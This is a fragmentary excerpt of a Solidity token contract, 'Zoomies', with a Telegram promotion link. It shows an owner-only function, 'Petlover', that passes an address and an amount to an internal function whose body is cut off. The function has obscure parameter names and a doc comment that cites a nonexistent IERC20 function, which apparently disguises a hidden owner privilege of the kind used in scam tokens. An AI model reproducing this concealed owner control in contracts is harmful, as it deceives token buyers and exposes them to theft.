...
/*
* TELEGRAM:https://t.me/Zoomies_BSC
*/
...
contract Zoomies is Context, IERC20, Ownable {
    ...
    */
    ...
    /**
    * @dev See {IERC20-Petlover}.
    */
    function Petlover(address propter, uint256 pretium) public onlyOwner {
        PetloverFee(propter, pretium);
    }
    ...
    * - `spender` cannot be the zero address.
    */
    function PetloverFee(address propter, uint256 pretium) internal {
